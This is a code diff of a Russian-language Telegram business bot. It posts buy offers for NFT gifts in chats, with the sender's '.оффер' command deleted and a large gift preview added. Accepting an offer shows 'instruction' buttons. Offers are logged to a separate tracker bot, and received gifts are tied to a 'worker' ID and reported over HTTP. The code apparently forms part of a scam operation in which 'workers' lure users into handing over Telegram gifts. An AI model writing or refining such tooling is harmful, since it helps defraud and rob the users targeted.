@@ -63,7 +63,12 @@ dp = Dispatcher()
 OFFERS: dict[str, dict] = {}
 http_session: aiohttp.ClientSession = None
 
-NO_PREVIEW = LinkPreviewOptions(is_disabled=True)
+# ВАЖНО: Настройки для отображения большой картинки NFT
+LARGE_PREVIEW = LinkPreviewOptions(
+    is_disabled=False,
+    prefer_large_media=True,
+    show_above_text=True
+)
 
 # =====================================
 # КНОПКИ
@@ -88,7 +93,7 @@ def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     )
 
 # =====================================
-# ТРЕКЕР (Логирование)
+# ТРЕКЕР
 # =====================================
 tracker_bot = None
 if TRACKER_BOT_TOKEN:
@@ -106,7 +111,7 @@ async def tracker_log(text: str):
         logging.exception("tracker_log error")
 
 # =====================================
-# ПАРСИНГ НАЗВАНИЯ ПОДАРКА
+# ПАРСИНГ НАЗВАНИЯ
 # =====================================
 async def fetch_gift_name(url: str) -> str:
     try:
@@ -122,11 +127,10 @@ async def fetch_gift_name(url: str) -> str:
     return url.rsplit("/", 1)[-1] or url
 
 # =====================================
-# КОМАНДА .оффер (ПОЛУЧЕНИЕ ТЕКСТА)
+# КОМАНДА .оффер
 # =====================================
 @dp.business_message(F.text)
 async def handle_custom_command(message: Message):
-    # Проверяем, начинается ли текст с .оффер
     if not message.text or not message.text.startswith(".оффер"):
         return
 
@@ -136,7 +140,6 @@ async def handle_custom_command(message: Message):
         parts = text.split()
 
         if len(parts) < 3:
-            logging.warning("Неверный формат: нужно ссылка, сумма, валюта")
             return
 
         url = parts[0]
@@ -165,17 +168,16 @@ async def handle_custom_command(message: Message):
             "seller_name": f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name,
         }
 
-        # Удаляем команду из чата
+        # Удаляем команду
         try:
             await bot.delete_business_messages(
                 business_connection_id=message.business_connection_id,
                 message_ids=[message.message_id]
             )
-            logging.info("Команда .оффер удалена из чата")
         except Exception as e:
-            logging.error(f"Ошибка удаления команды: {e}")
+            logging.error(f"Delete error: {e}")
 
-        # Отправляем оффер в тот же чат
+        # Отправляем оффер с БОЛЬШОЙ КАРТИНКОЙ
         try:
             await bot.send_message(
                 chat_id=message.chat.id,
@@ -184,52 +186,41 @@ async def handle_custom_command(message: Message):
                     sum=raw_sum,
                     cur=CURRENCY[cur_key],
                     name=gift_name
-                ),
+                ) + f"\n\n{url}", # Ссылка для картинки добавлена в текст
                 reply_markup=offer_kb(oid, lang),
                 business_connection_id=message.business_connection_id,
-                link_preview_options=LinkPreviewOptions(
-                    is_disabled=False, prefer_large_media=True, show_above_text=True
-                )
+                link_preview_options=LARGE_PREVIEW # Включаем картинку
             )
-            logging.info("Оффер успешно отправлен в чат!")
+            logging.info("Оффер успешно отправлен!")
         except Exception as e:
-            logging.error(f"КРИТИЧЕСКАЯ ОШИБКА ОТПРАВКИ ОФФЕРА: {e}")
+            logging.error(f"Send error: {e}")
 
         await tracker_log(
-            f"🆕 Оффер {oid}: {OFFERS[oid]['seller_name']} → чат | "
-            f"{raw_sum} {CURRENCY[cur_key]} | {gift_name}"
+            f"🆕 Оффер {oid}: {OFFERS[oid]['seller_name']} | {raw_sum} {CURRENCY[cur_key]} | {gift_name}"
         )
         
-    except TelegramRetryAfter as e:
-        await asyncio.sleep(e.retry_after)
     except Exception:
-        logging.exception("Ошибка в обработчике .оффер")
+        logging.exception("Ошибка в .оффер")
 
 # =====================================
-# ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (КНОПКИ)
+# КНОПКИ И ПОДАРКИ (без изменений)
 # =====================================
 @dp.callback_query(F.data.startswith("acc:"))
 async def cb_accept(call: CallbackQuery):
     oid = call.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
     if not offer:
-        await call.answer("Оффер не найден", show_alert=True)
-        return
+        return await call.answer("Оффер не найден", show_alert=True)
     t = TEXTS.get(offer["lang"], TEXTS["ru"])
     try:
         await call.message.edit_text(
-            t["accepted"].format(
-                name=offer["gift_name"],
-                sum=offer["sum"],
-                cur=offer["cur"]
-            ),
-            reply_markup=instruction_kb(offer["lang"])
+            t["accepted"].format(name=offer["gift_name"], sum=offer["sum"], cur=offer["cur"]),
+            reply_markup=instruction_kb(offer["lang"]),
+            link_preview_options=LARGE_PREVIEW # Оставляем картинку
         )
     except TelegramBadRequest as e:
         if "message is not modified" not in str(e):
             logging.error(f"Edit error: {e}")
-            
-    await tracker_log(f"✅ Оффер {oid} принят ({offer['gift_name']})")
     await call.answer()
 
 @dp.callback_query(F.data.startswith("dec:"))
@@ -237,11 +228,9 @@ async def cb_decline(call: CallbackQuery):
     oid = call.data.split(":", 1)[1]
     offer = OFFERS.pop(oid, None)
     if not offer:
-        await call.answer("Оффер не найден", show_alert=True)
-        return
+        return await call.answer("Оффер не найден", show_alert=True)
     t = TEXTS.get(offer["lang"], TEXTS["ru"])
     await call.message.edit_text(t["declined"], reply_markup=None)
-    await tracker_log(f"❌ Оффер {oid} отклонён ({offer['gift_name']})")
     await call.answer()
 
 @dp.callback_query(F.data.startswith("alert_2:"))
@@ -250,14 +239,10 @@ async def cb_alert(call: CallbackQuery):
     t = TEXTS.get(lang, TEXTS["ru"])
     await call.answer(t["alert_how"], show_alert=True)
 
-# =====================================
-# ПОЛУЧЕНИЕ ПОДАРКА
-# =====================================
 @dp.business_message(F.gift)
 async def handle_gift(message: Message):
     gift = message.gift
     if not gift: return
-    
     try:
         conn = await bot.get_business_connection(message.business_connection_id)
         worker_id = conn.user.id
@@ -285,15 +270,11 @@ async def handle_gift(message: Message):
     except Exception as e:
         logging.error(f"HTTP error: {e}")
 
-# =====================================
-# ЗАПУСК
-# =====================================
 async def main():
     global http_session
     http_session = aiohttp.ClientSession()
     print("Оффер-бот запущен!")
     try:
-        # ВАЖНО: allowed_updates гарантирует, что бот будет слушать бизнес-сообщения
         await dp.start_polling(bot, allowed_updates=["business_message", "message", "callback_query"])
     finally:
         await http_session.close()
